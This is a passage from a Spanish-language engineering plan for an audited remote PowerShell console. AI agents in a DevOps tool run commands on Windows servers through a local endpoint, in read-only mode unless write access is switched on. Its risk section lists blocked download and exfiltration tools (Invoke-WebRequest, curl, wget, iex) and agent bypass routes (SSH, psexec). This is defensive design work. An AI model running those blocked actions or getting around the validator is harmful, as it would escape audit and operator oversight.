     `base_url = request.host_url.rstrip("/")`. `runtime` validado contra `_CLI_RUNTIMES`
     (import de `api.devops_agent`). Consecuencia sancionada: las ejecuciones de consola
     comparten `agent_type="devops"` con el chat del plan 90, PERO su ticket es
     `ado_id=-4` (no `-2`), así que el listado del plan 90 (que filtra `ado_id==-2`) NUNCA
     las mezcla, y viceversa (la ruta 7 filtra `ado_id==-4`). Verificado sin tocar 90.
   - Respuesta 202 `{ok, conversation_id, execution_id, runtime, server_alias}`.
5. `POST /conversations/<int:cid>/message` — mismo contrato dual del plan 90 (stdin vivo
   si el último run está `running`, si no `_launch_turn` nuevo — copiar la lógica de
   `api/devops_agent.py:103-166` filtrando por `ado_id=-4`). El mensaje también se envuelve
   con `build_console_prompt(server_alias, base_url, message, cid, write_enabled=<estado>)`
   SOLO cuando abre turno nuevo (en stdin vivo va crudo). `server_alias` y `write_enabled`
   se leen de `_conv_meta(ticket)`; `cid` es el id de la conversación.
6. `POST /conversations/<int:cid>/write-mode` — body `{"enabled": true|false}` (HITL §3.2):
   actualiza `write_enabled` en el JSON de `description` y **audita**
   `append_audit(alias, {kind:"write_mode", enabled, conversation_id, user})`. 404 si la
   conversación no existe o no es `ado_id=-4`.
7. `GET /conversations?server=<alias>` — lista SOLO conversaciones `ado_id=-4` cuyo
   `_conv_meta()["server_alias"] == alias` (param obligatorio → 400 si falta), shape del
   item igual al del plan 90 (`api/devops_agent.py:186-214`) + `server_alias` +
   `write_enabled`.

**Registro del blueprint:** en `Stacky Agents/backend/api/__init__.py` (donde se registran
los sub-blueprints devops): agregar el import junto a
`api/__init__.py:46-47` (`from .devops_servers import bp as devops_servers_bp`) →
`from .devops_remote_console import bp as devops_remote_console_bp  # Plan 105`, y la línea
`api_bp.register_blueprint(devops_remote_console_bp)` junto a los demás
`api_bp.register_blueprint(...)` (bloque desde `api/__init__.py:54`). Copiar el patrón
exacto de `devops_servers_bp`.

**Tests PRIMERO** — `Stacky Agents/backend/tests/test_plan105_remote_console_api.py`
(Flask test client; `run_remote`/`check_winrm`/keyring mockeados; DB de test como en
`test_plan90_*`):
- `test_f2_all_routes_404_flag_off` — con flag OFF, las 7 rutas devuelven 404.
- `test_f2_exec_409_servers_disabled` — flag consola ON + servers OFF ⇒ 409.
- `test_f2_exec_non_json_400` — POST form-encoded ⇒ 400 (patrón C5 plan 91).
- `test_f2_exec_read_only_403` — `run_remote` mock devuelve `command_not_read_only` ⇒ 403.
- `test_f2_exec_manual_no_conversation_is_read_only` (C5 v2) — POST `/exec` con `alias` y
  `command` pero SIN `conversation_id` ⇒ `run_remote` recibe `mode="read_only"` (el camino
  manual sin agente jamás escala a escritura por sí solo).
- `test_f2_exec_write_requires_conversation_flag` — conversación con `write_enabled=False`
  ⇒ `run_remote` recibe `mode="read_only"`; tras POST `/write-mode {"enabled":true}` ⇒
  recibe `mode="write"`.
- `test_f2_write_mode_wrong_alias_stays_read_only` — conversación de alias A no habilita
  escritura en alias B.
- `test_f2_conversation_created_with_external_id_sealed` — `external_id == -ticket.id` y
  `description` JSON con `server_alias`.
- `test_f2_conversations_filtered_by_alias` (KPI-4) — 2 conversaciones (alias A y B):
  `GET /conversations?server=A` devuelve solo la de A.
- `test_f2_conversations_missing_server_param_400`.
- `test_f2_message_reuses_dual_path` — último run `running` ⇒ `send_input` mockeado
  llamado; sin run vivo ⇒ `_launch_turn` (mock) llamado.
- `test_f2_write_mode_toggle_audited` — el toggle escribe entrada `kind="write_mode"`.
- `test_f2_audit_endpoint_paginates` — limit/offset respetados; alias inválido 400.

**Comando:** `cd "Stacky Agents/backend" && venv/Scripts/python.exe -m pytest tests/test_plan105_remote_console_api.py -q`
**Criterio binario:** 13 tests en verde.
**Flag:** `STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED` (gate duro 404).
**Runtimes:** conversaciones = CLI runtimes (restricción heredada del plan 90, §3.6);
`/exec`, `/audit`, `/winrm` son runtime-agnósticos. **Trabajo del operador:** ninguno.

---

### F3 — Prompt de consola (contrato del agente, sin credenciales)

**Objetivo:** el agente sabe EXACTAMENTE cómo operar el servidor vía el endpoint local, en
los términos del riel §3.1, con texto idéntico para ambos runtimes CLI.

**Archivo NUEVO:** `Stacky Agents/backend/services/remote_console_prompt.py` — función pura
(testeable sin Flask):

```python
def build_console_prompt(server_alias: str, base_url: str, message: str,
                         conversation_id: int, *, write_enabled: bool) -> str:
    """Envuelve el mensaje del operador con el contrato de la consola remota.

    C2 (v2): `conversation_id` es POSICIONAL y OBLIGATORIO (el template lo interpola en
    el JSON del curl). Todos los call sites de F2 (rutas 4 y 5) lo pasan.
    """
```

Contenido EXACTO del envoltorio (f-string; `{...}` interpolados):

```
[CONSOLA REMOTA STACKY — servidor: {server_alias}]

Sos un asistente de operaciones. El operador te pide algo sobre el servidor
"{server_alias}". NO tenés acceso directo al servidor: TODO comando remoto se ejecuta
llamando a este endpoint HTTP local (la credencial la maneja Stacky; NUNCA pidas ni
uses passwords):

  curl.exe -s -X POST {base_url}/api/devops/console/exec ^
    -H "Content-Type: application/json" ^
    -d "{{\"alias\":\"{server_alias}\",\"command\":\"<COMANDO POWERSHELL>\",\"conversation_id\":{{CONVERSATION_ID}}}}"

Reglas:
1. Modo actual: {"LECTURA+ESCRITURA (el operador lo habilitó)" if write_enabled else
   "SOLO LECTURA (Get-*, Test-*, dir, type...). Si necesitás mutar algo, explicáselo al
   operador y pedile que active el modo escritura en la UI; NO intentes rodear el límite."}
2. Un comando por llamada; preferí comandos cortos y componibles.
3. La respuesta del endpoint es JSON {{ok, stdout, stderr, exit_code, error}}. Si
   ok=false explicá el error al operador en castellano llano.
4. Todo lo que ejecutás queda auditado. No ejecutes nada que el operador no haya pedido.
5. Al terminar, respondé al operador con un resumen claro de hallazgos y comandos usados.

PEDIDO DEL OPERADOR:
{message}
```

Notas de implementación:
- `{{CONVERSATION_ID}}` se reemplaza por `conversation_id` (parámetro posicional de la
  firma, C2 v2). El pseudocódigo de arriba es la plantilla; la función interpola TODO (sin
  placeholders residuales — test lo verifica).
- `^` es el continuador de línea de cmd; en los runtimes CLI de Windows el agente puede
  igualmente emitir la llamada en una línea. El texto lo aclara implícitamente al ser un
  ejemplo.
- C1 (v2): NO hay `context_blocks` propio. F2 pasa el string devuelto por
  `build_console_prompt` como el `message` de `_launch_turn`, que a su vez lo envuelve en
  su block `id="devops-chat"` (plan 90, sin modificar). El contrato de consola vive en el
  contenido de ese block. No se toca `api/devops_agent.py`.

**Tests PRIMERO** — `Stacky Agents/backend/tests/test_plan105_console_prompt.py`:
- `test_f3_prompt_contains_alias_url_and_message`.
- `test_f3_prompt_read_only_wording` — con `write_enabled=False` incluye "SOLO LECTURA" y
  NO incluye "ESCRITURA (el operador lo habilitó".
- `test_f3_prompt_write_wording` — inverso.
- `test_f3_prompt_no_placeholders_left` — no quedan `{CONVERSATION_ID}` ni `{server_alias}`
  sin interpolar; el `conversation_id` numérico aparece en el JSON del curl.
- `test_f3_prompt_never_mentions_password` — la palabra "password" solo aparece en la frase
  "NUNCA pidas ni uses passwords" (assert de conteo == 1) y no hay otros términos de secreto
  (`SR_PASS` ausente).

**Comando:** `cd "Stacky Agents/backend" && venv/Scripts/python.exe -m pytest tests/test_plan105_console_prompt.py -q`
**Criterio binario:** 5 tests en verde. **Flag:** heredada de F2.
**Runtimes:** texto ÚNICO para claude_code_cli y codex_cli (ambos ejecutan `curl.exe`);
Copilot no recibe este prompt (§3.6, degradación = modo manual UI). **Trabajo del
operador:** ninguno.

---

### F4 — Frontend: sección "Consola remota" (chat + auditoría + switch por servidor)

**Objetivo:** la experiencia 1-click: seleccionar servidor → conversar/ejecutar → ver
auditoría; cambiar de servidor re-filtra todo.

**Archivos:**

1. NUEVO `Stacky Agents/frontend/src/components/devops/RemoteConsoleSection.tsx`:
   - Props: recibe el contexto de sección del shell (mismo shape que `ServersSection.tsx` —
     COPIAR la firma real de ese archivo, no inventarla).
   - Layout en 3 zonas (usar clases existentes de `devops.module.css`; si falta alguna,
     agregarla AL FINAL del archivo sin tocar reglas existentes):
     a. **Barra superior (header de servidor activo):** ver `[ADICIÓN ARQUITECTO]` — NO es
        un `window.confirm` nativo. Es un header-card con: alias + host + chip-semáforo
        WinRM (`GET /api/devops/console/winrm/<alias>` al montar y al cambiar alias: verde
        ok / rojo con `detail` en tooltip + botón "Reintentar") + **badge de modo
        persistente** (READ-ONLY verde / ESCRITURA ámbar) + toggle "Permitir escritura
        (esta conversación)" con **confirmación in-panel** (paso de doble-click estilizado,
        C4 v2), nunca diálogo nativo del navegador.
     b. **Columna izquierda:** lista de conversaciones del servidor activo
        (`GET /api/devops/console/conversations?server=<alias>`) + botón "Nueva
        conversación". Click en una conversación la abre (readonly: título, estado del
        último run, link "Ver ejecución" que abre el CodexConsoleDock por execution_id —
        patrón plan 104 C15, `useWorkbench.setCodexConsoleExecution`).
     c. **Panel principal con 2 tabs:**
        - Tab **"Conversación"**: textarea de prompt + selector runtime
          (claude_code_cli/codex_cli; si el runtime global es github_copilot mostrar el
          MISMO aviso del chat DevOps de `DevOpsAgentSection.tsx` — buscar el string y
          reusarlo) + botón Enviar → POST `/conversations` o `/conversations/<id>/message`.
          Además un input compacto "Comando manual (sin agente)" que llama directo a
          POST `/exec` con el alias activo y muestra stdout/stderr — este camino funciona
          con CUALQUIER runtime (§3.6).
        - Tab **"Auditoría"**: tabla paginada de `GET /audit/<alias>` (columnas: fecha,
          usuario, modo, comando, ok/error, exit code, duración). Botón "Refrescar".
   - **Switch de servidor (KPI-1/KPI-4):** la sección NO tiene selector propio; usa el del
     shell. `useEffect` sobre el alias seleccionado re-fetchea conversaciones + auditoría +
     WinRM. Si no hay servidor seleccionado: estado vacío con hint "Registrá o seleccioná
     un servidor en la sección Servidores".

2. EDITAR `Stacky Agents/frontend/src/pages/DevOpsPage.tsx` — 1 entrada nueva en
   `DEVOPS_SECTIONS` (patrón exacto de las vecinas, `DevOpsPage.tsx:82-121`):
   ```ts
   {
     id: 'remote-console',
     label: 'Consola remota',
     healthKey: 'remote_console_enabled',
     gateFlagKey: 'STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED',
     gateMessage: 'Activá la consola remota para ejecutar prompts y comandos PowerShell auditados sobre el servidor seleccionado.',
     render: (ctx) => <RemoteConsoleSection ... />,  // mismos props que ServersSection
   }
   ```
   El gate lo renderiza el SHELL (prohibido hand-rollear el banner dentro de la sección,
   riel §3.12 plan 87).

3. NUEVO cliente API: agregar las funciones al módulo API devops existente del frontend
   (localizarlo con grep de `"/api/devops/servers"` bajo `frontend/src/` y agregar AL
   MISMO archivo): `consoleExec`, `consoleAudit`, `consoleWinrm`,
   `consoleStartConversation`, `consoleSendMessage`, `consoleListConversations`,
   `consoleSetWriteMode` — shapes 1:1 con F2.

---

**[ADICIÓN ARQUITECTO] — Paquete de UX "consola profesional" (directiva del operador:
muy cómoda, eficiente, novedosa y profesional).**

Todo lo siguiente es puramente frontend, opt-in por naturaleza (solo se ve con la flag ON),
CERO config nueva, HITL intacto (el operador sigue disparando cada turno y cada exec), y
reusa `devops.module.css` (reglas nuevas SOLO al final del archivo, sin tocar existentes).
Coherencia visual: mismos tokens/clases que `ServersSection.tsx` y `DevOpsAgentSection.tsx`.

- **UX-1 — Header de servidor activo (reemplaza la barra pobre).** Card fija arriba con:
  `alias` en grande, `host` en gris, chip-semáforo WinRM (verde "WinRM OK" / rojo con
  `detail` + botón "Reintentar" que re-hace `GET /winrm/<alias>`), y el **badge de modo**
  (abajo). Da contexto instantáneo al cambiar de servidor (refuerza KPI-1/KPI-4 sin tocar
  el selector del shell). Estado vacío claro si no hay servidor seleccionado.

- **UX-2 — Badge de modo PERSISTENTE + confirmación in-panel (C4, mata el `window.confirm`).**
  Un badge SIEMPRE visible pegado al input: `READ-ONLY` (verde) o `ESCRITURA` (ámbar,
  con ícono de aviso). El toggle a escritura NO usa diálogo nativo: al primer click el
  botón se transforma in-place en "⚠ Confirmá: habilitar ESCRITURA en «<alias>»" (dos
  botones: "Sí, habilitar" / "Cancelar"); recién el segundo click hace
  `POST /write-mode {enabled:true}`. Al volver a lectura, un solo click. El badge ámbar
  persiste mientras dure la conversación en escritura → el operador NUNCA olvida en qué
  modo está (mitiga R2 de raíz). Profesional y sin popups del navegador.

- **UX-3 — Auditoría TEJIDA en el stream como "command-cards" (el toque novedoso).** Además
  de la tab "Auditoría" (que se mantiene como vista completa/paginada), cada comando que el
  agente ejecuta aparece EN LÍNEA dentro de la conversación como una card colapsable:
  encabezado `▸ <comando>` + chip `ok/error` + `exit_code` + `duración` + botón "copiar
  comando"; expandida muestra stdout/stderr (truncado). Fuente de datos: la sección
  poll-ea `GET /audit/<alias>?limit=N` y correlaciona por `conversation_id`. Así "auditable"
  deja de ser un lugar aparte que hay que recordar mirar: la trazabilidad está donde ocurre
  la acción. Reusa el patrón visual de `CodexConsoleDock`/mensajes del chat DevOps.

- **UX-4 — Chips de diagnóstico 1-click (eficiencia real, HITL intacto).** Fila de chips
  sobre el textarea con los diagnósticos más pedidos, que SOLO PRE-RELLENAN el prompt (no
  envían solos — el operador revisa y presiona Enviar): "Ver últimos logs", "Espacio en
  disco", "Procesos activos", "Servicios detenidos", "Últimos errores del Visor de eventos".
  Son texto en castellano que el agente traduce a PowerShell de lectura. Reduce tipeo del
  90% de los usos sin quitar el control humano. (Los chips son estáticos en el front; NO son
  config del operador.)

- **UX-5 — Atajos de teclado y foco.** `Enter` envía, `Shift+Enter` = nueva línea,
  `Ctrl/Cmd+Enter` fuerza envío; al abrir/crear conversación el foco cae en el textarea; al
  cambiar de servidor se limpia el borrador. Sin dependencias nuevas.

Ninguna de estas piezas agrega endpoints ni flags: todas consumen las 7 rutas de F2. Si
alguna clase CSS falta en `devops.module.css`, se agrega AL FINAL (badge-modo, chip-winrm,
command-card) sin alterar reglas previas.

**Tests PRIMERO** — `Stacky Agents/frontend/src/pages/__tests__/RemoteConsoleSection.test.ts`
(convención del repo: `ServersSection.test.ts` vive ahí; vitest con fetch mockeado):
- `test se renderiza vacío sin servidor seleccionado` (hint visible).
- `test cambia de alias ⇒ re-fetch de conversations y audit con el alias nuevo` (KPI-4).
- `test toggle escritura usa confirmación in-panel (NO window.confirm) y hace POST /write-mode`
  (C4 v2): el spy sobre `window.confirm` NUNCA se llama; el primer click muestra el paso de
  confirmación, el segundo dispara el POST. Verifica que el badge de modo pasa a "ESCRITURA".
- `test comando manual llama POST /exec con alias activo y muestra stdout`.
- `test auditoría renderiza filas del mock` (tab completa).
- `test chip de diagnóstico solo pre-rellena el prompt y NO envía` (UX-4, HITL): click en
  un chip setea el textarea; ningún POST se dispara hasta "Enviar".
- `test command-card in-line muestra comando+exit_code+duración desde el audit mock` (UX-3).

**Comandos:**
`cd "Stacky Agents/frontend" && npx vitest run src/pages/__tests__/RemoteConsoleSection.test.ts`
`cd "Stacky Agents/frontend" && npx tsc --noEmit`
**Criterio binario:** 7 tests vitest en verde + `tsc` 0 errores.
**Flag:** gate declarativo vía `healthKey`.
**Runtimes:** UI runtime-agnóstica; conversación restringida a CLI (aviso Copilot reusado);
comando manual funciona siempre. **Trabajo del operador:** opt-in (activar flag desde el
propio banner; default off).

---

### F5 — Cierre: ratchet, export de defaults, doc

**Objetivo:** blindaje e higiene de serie.

1. **Ratchet de tests (obligatorio, plan 49):** agregar los 4 archivos
   `test_plan105_remote_console_flag.py`, `test_plan105_remote_exec_service.py`,
   `test_plan105_remote_console_api.py`, `test_plan105_console_prompt.py` a
   `HARNESS_TEST_FILES` en AMBOS lanzadores (`.sh` y `.ps1` — localizar con
   `grep -rl "HARNESS_TEST_FILES" "Stacky Agents"` y editar los dos).
2. **harness_defaults.env:** NO editar a mano. Dejar constancia en la sección de estado del
   plan de que la flag nueva nace `false` y que el export
   (`deployment/export_harness_defaults.py`) la incorporará en la próxima corrida del
   operador (hay drift preexistente de la serie 87-91 — NO mezclarlo con este plan).
3. **Actualizar encabezado de estado de ESTE doc** al implementar (riel del pipeline).
4. **No-regresión dirigida (por archivo, venv):**
   `venv/Scripts/python.exe -m pytest tests/test_plan91_server_registry.py tests/test_plan91_servers_endpoints.py tests/test_harness_flags.py tests/test_harness_flags_requires.py -q`
   (los archivos del plan 90 se localizan con `ls tests/ | grep plan90` y se corren esos;
   nombres 91 verificados: `test_plan91_server_registry.py`,
   `test_plan91_servers_endpoints.py`, `test_plan91_rdp_endpoint.py`).

**Criterio binario:** ratchet verde (meta-test del plan 49 pasa) + no-regresión verde.
**Trabajo del operador:** ninguno.

---

## 6. Cómo se honran las 4 premisas (mapa premisa → mecanismo → test)

| Premisa | Mecanismo | Verificación |
|---|---|---|
| MUY SIMPLE | selector existente + prompt + Enter; sin config nueva por uso; modo manual sin agente | KPI-1; vitest de sección |
| REVERSIBLE | nada instalado en el server; read-only default; flag OFF = byte-idéntico; auditoría local borrable | KPI-3; `test_f2_all_routes_404_flag_off`; `test_f1_read_only_rejects_mutants` |
| AUDITABLE | `run_remote` = único camino, audita SIEMPRE (éxito, error y rechazo); toggle de escritura también auditado | KPI-2; `test_f1_no_remote_exec_bypass`; `test_f2_write_mode_toggle_audited` |
| SWITCH 1-CLICK con trazabilidad separada | alias sellado en la conversación (description JSON) y en el nombre del JSONL; cambiar alias re-filtra todo | KPI-4; `test_f2_conversations_filtered_by_alias`; vitest de re-fetch |

## 7. Riesgos y mitigaciones

- **R1 — WinRM deshabilitado en el destino.** Mitigación: semáforo `GET /winrm/<alias>` en
  la UI + error verbatim con hint (`Enable-PSRemoting` lo corre el OPERADOR en el server,
  §3.8). Sin WinRM la consola no ejecuta: degradación honesta, no silenciosa.
- **R2 — El validador read-only tiene falsos negativos/positivos.** Diseño conservador
  (rechaza ante la duda). C3 (v2): además de redirect/`iex`/verbos mutantes, la blocklist
  ahora cubre call-operator `&`, `.Invoke`, `$(`, backtick, `[scriptblock]`, descarga/exfil
  (`Invoke-WebRequest`/`Invoke-RestMethod`/`iwr`/`irm`/`curl`/`wget`), `Start-Process`,
  `Add-Type`, y RECHAZA todo comando con llaves `{ }` (vector de método .NET arbitrario tipo
  `$_.Delete()` que ningún blocklist de cmdlets puede enumerar). Falso positivo esperado:
  filtros `Where-Object { }` / `ForEach-Object { }` quedan bloqueados en lectura → el
  operador habilita escritura (auditada) o el agente filtra con `-Filter`/`Select-String`/
  `Select-Object`. La garantía dura NO es el validador (regex sobre PowerShell es leaky por
  naturaleza) sino: auditoría 100% + escritura opt-in por conversación + el agente sin
  credencial (§3.1). El threat actor es el AGENTE, no un humano adversario (mono-operador).
- **R3 — El agente intenta rodear el endpoint (SSH/psexec propios).** El prompt lo prohíbe
  (F3) y el agente no tiene la credencial (§3.1): sin password no hay canal alternativo.
- **R4 — Password en memoria del proceso hijo.** Aceptado (igual que RDP/cmdkey del plan
  91): vive lo que dura el `Invoke-Command`; nunca argv/disco/logs (test KPI-5).
- **R5 — Crecimiento del JSONL.** Solo se auditan metadatos + hash (no stdout completo);
  mono-operador; rotación fuera de scope (documentado).
- **R6 — `description` como JSON en Ticket es un contrato blando.** Se centraliza en
  `_conv_meta()` (tolerante) y está testeado; migrar a columna propia queda fuera de scope.

## 8. Fuera de scope (explícito)

- Servidores Linux / SSH. Transferencia de archivos con UI. Rotación/retención del JSONL.
- Habilitar WinRM remotamente desde Stacky (decisión del operador EN el servidor).
- Scheduling, monitoreo continuo o auto-diagnóstico sin prompt (violaría §3.2).
- Sesiones PSSession persistentes entre comandos (cada exec es stateless; simple > óptimo).
- Aprobación comando-a-comando en modo escritura (el HITL es el toggle por conversación;
  endurecerlo sería un plan futuro si el operador lo pide).
- Tocar el drift preexistente de `harness_defaults.env` (serie 87-91).

## 9. Glosario

- **alias:** nombre corto del servidor en el registro del plan 91 (key del keyring).
- **keyring / Credential Manager:** vault del SO donde vive el password (service
  `stacky-devops`, `server_registry.py:28`).
- **WinRM / Invoke-Command:** remoting nativo de Windows para ejecutar PowerShell en otro
  host; requiere listener habilitado en el destino.
- **conversación:** `Ticket` con `ado_id=-4` que agrupa turnos del agente (patrón plan 90,
  que usa `-2`; el doctor del 104 usa `-3`).
- **runtime CLI:** `claude_code_cli` o `codex_cli` — agentes headless locales de Stacky.
- **shell del panel / DEVOPS_SECTIONS:** registro declarativo de secciones DevOps
  (`DevOpsPage.tsx:51-121`); el gate por flag lo dibuja el shell (`FlagGateBanner`).
- **ratchet:** meta-test del plan 49 que obliga a registrar todo test backend nuevo en
  `HARNESS_TEST_FILES` (lanzadores sh y ps1).
- **venv del repo:** `Stacky Agents/backend/venv` (py3.13); pytest SIEMPRE por archivo.

## 10. Orden de implementación

1. F0 (flag + health + requires) — tests → código → verde.
2. F1 (servicio remote_exec + ps1 + auditoría) — tests → código → verde.
3. F2 (blueprint consola) — tests → código → verde.
4. F3 (prompt builder) — tests → código → verde (F2 rutas 4-5 se cierran aquí si se
   implementó F2 con el builder stubbeado; alternativa válida: implementar F3 antes que F2).
5. F4 (frontend) — tests vitest → código → verde + tsc.
6. F5 (ratchet + no-regresión + estado del doc).

## 11. Definición de Hecho (DoD)

- [ ] 4 archivos de test backend nuevos verdes (≈36 tests: F0=4, F1=14, F2=13, F3=5)
      corridos POR ARCHIVO con el venv.
- [ ] 7 tests vitest nuevos verdes + `npx tsc --noEmit` sin errores.
- [ ] No-regresión dirigida verde (F5.4).
- [ ] Flag OFF ⇒ 404 en las 7 rutas y sección gateada (KPI-3 verificado por test).
- [ ] Grep manual: el password de prueba no aparece en ningún artefacto (audit JSONL,
      logs de test, prompts generados).
- [ ] Ratchet actualizado en sh y ps1.
- [ ] Commits por fase SOLO con archivos de este plan (riel §3.10; jamás `git add -A`).
- [ ] Encabezado de estado de este doc actualizado a IMPLEMENTADO con hashes.
